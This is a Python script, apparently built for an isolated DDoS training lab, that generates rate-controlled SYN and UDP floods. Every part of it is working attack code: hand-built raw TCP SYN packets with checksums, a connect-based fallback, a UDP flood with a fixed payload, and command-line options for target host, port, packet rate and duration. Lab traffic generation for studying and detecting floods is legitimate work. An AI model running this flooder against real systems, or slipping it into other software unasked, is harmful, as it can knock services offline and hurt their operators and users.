"""Rate-controlled low-rate SYN and UDP flood generator for isolated DDoS lab."""

import argparse
import random
import socket
import struct
import time


def checksum(msg: bytes) -> int:
    s = 0
    for i in range(0, len(msg) - 1, 2):
        w = (msg[i] << 8) + msg[i + 1]
        s += w
    if len(msg) % 2:
        s += msg[-1] << 8
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def send_raw_syn_packet(sock: socket.socket, src_ip: str, dst_ip: str, src_port: int, dst_port: int):
    """Build and send raw IPv4 TCP SYN packet."""
    # IP Header
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20
    pkt_id = random.randint(1000, 65535)
    frag_off = 0
    ttl = 64
    proto = socket.IPPROTO_TCP
    check = 0
    saddr = socket.inet_aton(src_ip)
    daddr = socket.inet_aton(dst_ip)
    ihl_version = (version << 4) + ihl

    ip_header = struct.pack("!BBHHHBBH4s4s", ihl_version, tos, tot_len, pkt_id, frag_off, ttl, proto, check, saddr, daddr)

    # TCP Header
    seq = random.randint(0, 4294967295)
    ack_seq = 0
    doff = 5
    syn_flag = 0x02  # SYN
    window = socket.htons(5840)
    tcp_check = 0
    urg_ptr = 0
    offset_res = (doff << 4) + 0

    tcp_header = struct.pack("!HHLLBBHHH", src_port, dst_port, seq, ack_seq, offset_res, syn_flag, window, tcp_check, urg_ptr)

    # Pseudo header for TCP checksum
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = struct.pack("!4s4sBBH", saddr, daddr, placeholder, protocol, tcp_length)
    tcp_check = checksum(psh + tcp_header)
    tcp_header = struct.pack("!HHLLBBH", src_port, dst_port, seq, ack_seq, offset_res, syn_flag, window) + struct.pack("H", tcp_check) + struct.pack("!H", urg_ptr)

    sock.sendto(ip_header + tcp_header, (dst_ip, 0))


def run_syn_flood(target_ip: str, target_port: int, rate_pps: int, duration_sec: int):
    """Send rate-controlled SYN flood."""
    print(f"Starting SYN flood -> {target_ip}:{target_port} at {rate_pps} pps for {duration_sec}s...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        use_raw = True
    except PermissionError:
        print("Raw sockets permission denied, using standard non-blocking connect SYN triggers...")
        use_raw = False

    interval = 1.0 / max(1, rate_pps)
    total_packets = int(rate_pps * duration_sec)
    start_time = time.perf_counter()
    packets_sent = 0

    for i in range(total_packets):
        target_time = start_time + (i * interval)
        now = time.perf_counter()
        to_sleep = target_time - now
        if to_sleep > 0.001:
            time.sleep(to_sleep - 0.0005)
        while time.perf_counter() < target_time:
            pass

        try:
            src_ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            src_ip = "172.20.0.4"
        src_port = random.randint(1024, 65535)

        if use_raw:
            try:
                send_raw_syn_packet(s, src_ip, target_ip, src_port, target_port)
            except Exception:
                pass
        else:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                sock.connect_ex((target_ip, target_port))
                sock.close()
            except Exception:
                pass
        packets_sent += 1

    actual_duration = time.perf_counter() - start_time
    measured_rate = packets_sent / max(0.001, actual_duration)
    print(f"SYN flood finished: {packets_sent} packets sent in {actual_duration:.2f}s (measured rate: {measured_rate:.2f} pps).")
    return packets_sent


def run_udp_flood(target_ip: str, target_port: int, rate_pps: int, duration_sec: int):
    """Send rate-controlled UDP flood."""
    print(f"Starting UDP flood -> {target_ip}:{target_port} at {rate_pps} pps for {duration_sec}s...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"DDoS_Lab_UDP_Flood_Payload_" + b"X" * 128

    interval = 1.0 / max(1, rate_pps)
    total_packets = int(rate_pps * duration_sec)
    start_time = time.perf_counter()
    packets_sent = 0

    for i in range(total_packets):
        target_time = start_time + (i * interval)
        now = time.perf_counter()
        to_sleep = target_time - now
        if to_sleep > 0.001:
            time.sleep(to_sleep - 0.0005)
        while time.perf_counter() < target_time:
            pass

        dst_p = target_port if target_port > 0 else random.randint(1024, 65535)
        try:
            sock.sendto(payload, (target_ip, dst_p))
            packets_sent += 1
        except Exception:
            pass

    actual_duration = time.perf_counter() - start_time
    measured_rate = packets_sent / max(0.001, actual_duration)
    print(f"UDP flood finished: {packets_sent} packets sent in {actual_duration:.2f}s (measured rate: {measured_rate:.2f} pps).")
    return packets_sent


def main():
    parser = argparse.ArgumentParser(description="Rate-controlled DDoS traffic generator.")
    parser.add_argument("--type", choices=["syn", "udp"], default="syn", help="Attack type.")
    parser.add_argument("--target", default="victim-web", help="Target IP or hostname.")
    parser.add_argument("--port", type=int, default=80, help="Target port.")
    parser.add_argument("--rate", type=int, default=100, help="Rate in packets per second (pps).")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds.")
    args = parser.parse_args()

    target_ip = socket.gethostbyname(args.target)
    if args.type == "syn":
        run_syn_flood(target_ip, args.port, args.rate, args.duration)
    else:
        run_udp_flood(target_ip, args.port, args.rate, args.duration)


if __name__ == "__main__":
    main()
